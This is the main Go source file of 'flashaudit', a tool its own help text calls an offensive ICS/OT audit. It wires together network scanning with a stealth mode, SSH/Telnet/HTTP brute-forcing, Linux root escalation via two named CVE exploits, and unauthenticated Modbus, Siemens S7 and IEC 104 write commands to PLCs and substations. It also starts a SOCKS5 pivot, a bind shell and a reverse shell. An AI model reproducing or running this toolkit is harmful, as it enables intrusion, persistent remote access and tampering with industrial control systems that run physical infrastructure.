package main

import (
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func hexToBytes(s string) []byte {
	s = strings.ReplaceAll(s, " ", "")
	b, _ := hex.DecodeString(s)
	return b
}

const version = "0.2.0"

// logWriter is used by scan.go for progress output (stderr by default).
var logWriter io.Writer = os.Stderr

func main() {
	var (
		format       = "both"
		outDir       = "."
		stdout       = false
		noSys        = false
		noNet        = false
		doScan       = false
		doBrute        = false
		bruteUsers     = ""
		brutePassFile  = ""
		bruteSkipPairs = false
		bruteTarget    = ""
		doEscalate    = false
		doEscalateDf  = false
		escalateExec  = ""
		socksAddr    = ""
		bindAddr     = ""
		revAddr      = ""
		modbusWrite  = ""
		modbusRead   = ""
		s7Write      = ""
		s7Read       = ""
		iec104Cmd    = ""
		quiet        = false
		stealth      = false
	)
	for i := 1; i < len(os.Args); i++ {
		a := os.Args[i]
		switch {
		case a == "-h" || a == "--help":
			usage()
			return
		case strings.HasPrefix(a, "--format="):
			format = strings.TrimPrefix(a, "--format=")
		case strings.HasPrefix(a, "--out="):
			outDir = strings.TrimPrefix(a, "--out=")
		case strings.HasPrefix(a, "--ranges="):
			for _, r := range strings.Split(strings.TrimPrefix(a, "--ranges="), ",") {
				r = strings.TrimSpace(r)
				if r != "" {
					knownRanges = append(knownRanges, r)
				}
			}
		case a == "--stdout":
			stdout = true
		case a == "--no-system":
			noSys = true
		case a == "--no-network":
			noNet = true
		case a == "--scan":
			doScan = true
		case a == "--brute":
			doBrute = true
		case strings.HasPrefix(a, "--brute-user="):
			doBrute = true
			bruteUsers = strings.TrimPrefix(a, "--brute-user=")
		case strings.HasPrefix(a, "--brute-users="):
			doBrute = true
			bruteUsers = strings.TrimPrefix(a, "--brute-users=")
		case strings.HasPrefix(a, "--brute-passwords="):
			doBrute = true
			brutePassFile = strings.TrimPrefix(a, "--brute-passwords=")
		case a == "--brute-no-pairs":
			bruteSkipPairs = true
		case a == "--escalate":
			doEscalate = true
		case a == "--escalate-df":
			doEscalateDf = true
		case strings.HasPrefix(a, "--escalate-exec="):
			doEscalate = true
			escalateExec = strings.TrimPrefix(a, "--escalate-exec=")
		case strings.HasPrefix(a, "--socks="):
			socksAddr = strings.TrimPrefix(a, "--socks=")
		case strings.HasPrefix(a, "--bind="):
			bindAddr = strings.TrimPrefix(a, "--bind=")
		case strings.HasPrefix(a, "--reverse="):
			revAddr = strings.TrimPrefix(a, "--reverse=")
		case strings.HasPrefix(a, "--modbus-write="):
			modbusWrite = strings.TrimPrefix(a, "--modbus-write=")
		case strings.HasPrefix(a, "--modbus-read="):
			modbusRead = strings.TrimPrefix(a, "--modbus-read=")
		case strings.HasPrefix(a, "--s7-write="):
			s7Write = strings.TrimPrefix(a, "--s7-write=")
		case strings.HasPrefix(a, "--s7-read="):
			s7Read = strings.TrimPrefix(a, "--s7-read=")
		case strings.HasPrefix(a, "--brute-target="):
			bruteTarget = strings.TrimPrefix(a, "--brute-target=")
			doBrute = true
		case strings.HasPrefix(a, "--iec104="):
			iec104Cmd = strings.TrimPrefix(a, "--iec104=")
		case a == "--stealth":
			stealth = true
		case a == "--quiet":
			quiet = true
		}
	}
	ScanStealth = stealth
	if quiet {
		logWriter = io.Discard
	}

	start := time.Now()
	r := &Report{Tool: "flashaudit", Version: version, CollectedAt: start}

	collectHost(r)
	if !noSys {
		collectSystemChecks(r)
	}
	if !noNet {
		conns := collectConns(r)
		buildNetwork(&r.Network, conns)
		analyzeNetwork(r)
	}
	if doScan {
		r.ScanResults = ActiveScan(r)
	}
	bcfg := BruteConfig{SkipPairs: bruteSkipPairs, PassFile: brutePassFile}
	if bruteUsers != "" {
		bcfg.Users = strings.Split(bruteUsers, ",")
	}
	if doBrute {
		if bruteTarget != "" {
			BruteTarget(r, bruteTarget, bcfg)
		} else {
			RunBrute(r, bcfg)
		}
	}
	if doEscalate {
		TryEscalate(r, escalateExec)
	}
	if doEscalateDf {
		TryDirtyFrag(r, escalateExec)
	}

	// ICS read commands
	if modbusRead != "" {
		// format: IP[:PORT]/ADDR/COUNT
		parts := strings.SplitN(modbusRead, "/", 3)
		if len(parts) == 3 {
			hostPort := parts[0]
			ip := hostPort
			port := 502
			if idx := strings.LastIndex(hostPort, ":"); idx > 0 {
				if p, err2 := strconv.Atoi(hostPort[idx+1:]); err2 == nil && p > 0 {
					ip, port = hostPort[:idx], p
				}
			}
			addr, _ := strconv.Atoi(parts[1])
			count, _ := strconv.Atoi(parts[2])
			if count == 0 {
				count = 1
			}
			regs, err := ModbusReadRegisters(ip, port, 1, addr, count)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[modbus-read] %v\n", err)
				r.Add(Medium, "ICS/OT", "Modbus read échoué", err.Error(), modbusRead)
			} else {
				vals := make([]string, len(regs))
				for i, v := range regs {
					vals[i] = fmt.Sprintf("reg[%d] = %d (0x%04X)", addr+i, v, v)
				}
				fmt.Fprintf(os.Stderr, "[modbus-read] OK → %s addr=%d count=%d\n", ip, addr, count)
				r.Add(High, "ICS/OT", fmt.Sprintf("Modbus read : %s addr=%d count=%d", ip, addr, count),
					"Registres Modbus lus sans authentification.", vals...)
			}
		}
	}
	if s7Read != "" {
		// format: IP/DB/START/LEN
		parts := strings.SplitN(s7Read, "/", 4)
		if len(parts) == 4 {
			ip := parts[0]
			db, _ := strconv.Atoi(parts[1])
			startOff, _ := strconv.Atoi(parts[2])
			length, _ := strconv.Atoi(parts[3])
			if length == 0 {
				length = 16
			}
			data, err := S7ReadDB(ip, db, startOff, length)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[s7-read] %v\n", err)
				r.Add(Medium, "ICS/OT", "S7Comm read échoué", err.Error(), s7Read)
			} else {
				hexStr := hex.EncodeToString(data)
				fmt.Fprintf(os.Stderr, "[s7-read] OK → %s DB%d.DBB%d = %s\n", ip, db, startOff, hexStr)
				r.Add(High, "ICS/OT", fmt.Sprintf("S7Comm read : %s DB%d.DBB%d len=%d", ip, db, startOff, length),
					"Bloc de données Siemens lu sans authentification.",
					fmt.Sprintf("%s DB%d.DBB%d = %s", ip, db, startOff, hexStr))
			}
		}
	}

	// ICS write commands (execute before report so outcome is in findings)
	if modbusWrite != "" {
		ip, port, addr, val, err := ParseICSTarget(modbusWrite)
		if port == 0 {
			port = 502
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "[modbus] %v\n", err)
		} else if err := ModbusWriteRegister(ip, port, 1, addr, val); err != nil {
			fmt.Fprintf(os.Stderr, "[modbus] write échoué : %v\n", err)
			r.Add(Medium, "ICS/OT", "Modbus write échoué", err.Error(), modbusWrite)
		} else {
			fmt.Fprintf(os.Stderr, "[modbus] write OK → %s addr=%d val=%d\n", ip, addr, val)
			r.Add(Critical, "ICS/OT", fmt.Sprintf("Modbus write exécuté : %s addr=%d val=%d", ip, addr, val),
				"Registre Modbus modifié sans authentification.", modbusWrite)
		}
	}
	if s7Write != "" {
		// format: IP/DB/START/HEX  e.g. 192.168.10.5/1/0/DEADBEEF
		parts := strings.SplitN(s7Write, "/", 4)
		if len(parts) == 4 {
			ip := parts[0]
			db, _ := strconv.Atoi(parts[1])
			start, _ := strconv.Atoi(parts[2])
			hexData := parts[3]
			data := hexToBytes(hexData)
			if err := S7WriteDB(ip, db, start, data); err != nil {
				fmt.Fprintf(os.Stderr, "[s7] write échoué : %v\n", err)
				r.Add(Medium, "ICS/OT", "S7Comm write échoué", err.Error(), s7Write)
			} else {
				fmt.Fprintf(os.Stderr, "[s7] write OK → %s DB%d.DBB%d = %s\n", ip, db, start, hexData)
				r.Add(Critical, "ICS/OT", fmt.Sprintf("S7Comm write : %s DB%d.DBB%d = %s", ip, db, start, hexData),
					"Bloc de données Siemens S7 modifié sans authentification.", s7Write)
			}
		}
	}
	if iec104Cmd != "" {
		// format: IP[:PORT]/ASDU/IOA/VAL  e.g. 192.168.10.10/1/100/1
		ip, port, ioa, val, err := ParseICSTarget(iec104Cmd)
		parts := strings.SplitN(iec104Cmd, "/", 4)
		asdu := 1
		if len(parts) >= 2 {
			asdu, _ = strconv.Atoi(parts[1])
			if len(parts) >= 3 {
				ioa, _ = strconv.Atoi(parts[2])
			}
			if len(parts) >= 4 {
				val, _ = strconv.Atoi(parts[3])
			}
		}
		if port == 0 {
			port = 2404
		}
		if err == nil {
			if err := IEC104SendCommand(ip, port, asdu, ioa, val); err != nil {
				fmt.Fprintf(os.Stderr, "[iec104] commande échouée : %v\n", err)
				r.Add(Medium, "ICS/OT", "IEC104 commande échouée", err.Error(), iec104Cmd)
			} else {
				fmt.Fprintf(os.Stderr, "[iec104] commande OK → %s ASDU=%d IOA=%d val=%d\n", ip, asdu, ioa, val)
				r.Add(Critical, "ICS/OT", fmt.Sprintf("IEC104 commande envoyée : %s ASDU=%d IOA=%d val=%d", ip, asdu, ioa, val),
					"Commande RTU/substation envoyée sans authentification.", iec104Cmd)
			}
		}
	}

	// Async services (SOCKS5, shells) — started after report written
	asyncRunning := false
	if socksAddr != "" {
		asyncRunning = true
		go StartSOCKS5(socksAddr)
	}
	if bindAddr != "" {
		asyncRunning = true
		go BindShell(bindAddr)
	}
	if revAddr != "" {
		asyncRunning = true
		go ReverseShell(revAddr)
	}
	if asyncRunning {
		select {} // block forever — process stays alive for services
	}

	r.Duration = time.Since(start).Round(time.Millisecond).String()
	r.sortFindings()

	r.PrintSummary(os.Stderr)

	if stdout {
		if format == "json" {
			r.WriteJSON(os.Stdout)
		} else {
			r.WriteMarkdown(os.Stdout)
		}
		return
	}

	ts := start.Format("20060102-150405")
	base := fmt.Sprintf("flashaudit_%s_%s", safe(r.Host.Hostname), ts)
	if format == "json" || format == "both" {
		writeFile(filepath.Join(outDir, base+".json"), func(f *os.File) { r.WriteJSON(f) })
	}
	if format == "md" || format == "both" {
		writeFile(filepath.Join(outDir, base+".md"), func(f *os.File) { r.WriteMarkdown(f) })
	}
}

func writeFile(path string, fn func(*os.File)) {
	f, err := os.Create(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "erreur écriture %s: %v\n", path, err)
		return
	}
	defer f.Close()
	fn(f)
	fmt.Fprintf(os.Stderr, "-> %s\n", path)
}

func safe(s string) string {
	if s == "" {
		return "host"
	}
	return strings.Map(func(r rune) rune {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' {
			return r
		}
		return '-'
	}, s)
}

func usage() {
	fmt.Print(`flashaudit ` + version + ` — audit offensif ICS/OT (hôte + réseau + pivot)

Usage : flashaudit [options]

Sortie :
  --format=md|json|both     Format de rapport (défaut : both)
  --out=RÉPERTOIRE          Répertoire de sortie (défaut : .)
  --stdout                  Écrire sur stdout au lieu de fichiers
  --quiet                   Supprimer les messages de progression

Collecte :
  --no-system               Sauter les contrôles système
  --no-network              Sauter la cartographie réseau

Scan actif :
  --scan                    TCP sweep /24 (35 ports ICS/OT + infra)
  --ranges=CIDR[,CIDR]      Plages supplémentaires (ex: 192.168.10.0/24)
  --stealth                 Jitter 0–250 ms + concurrence réduite

Bruteforce :
  --brute                   SSH/Telnet/HTTP sur services découverts
  --brute-target=IP:PORT/PROTO  Cibler un service précis (ssh|telnet|http)
  --brute-user=USER         Restreindre à un login
  --brute-users=U1,U2       Restreindre à une liste de logins
  --brute-passwords=FILE    Fichier de mots de passe (1 par ligne)
  --brute-no-pairs          Désactiver fast-track paires vendeur

Attaques ICS/OT :
  --modbus-read=IP/ADDR/COUNT    FC03 lecture registres
  --modbus-write=IP/ADDR/VAL     FC06 écriture registre
  --s7-read=IP/DB/START/LEN      Lecture bloc de données Siemens
  --s7-write=IP/DB/START/HEX     Écriture bloc de données Siemens
  --iec104=IP/ASDU/IOA/VAL       Commande C_SC_NA_1 (RTU/substation)

Escalade (Linux) :
  --escalate                CopyFail (CVE-2026-31431)
  --escalate-df             DirtyFrag (CVE-2026-43284)
  --escalate-exec=BIN       Exécuter BIN en root après succès

Pivot & shells :
  --socks=ADDR              SOCKS5 no-auth (ex: 0.0.0.0:1080)
  --bind=ADDR               Bind shell TCP
  --reverse=ADDR            Reverse shell vers ADDR

Exécuter en root/administrateur pour la couverture complète.
`)
}
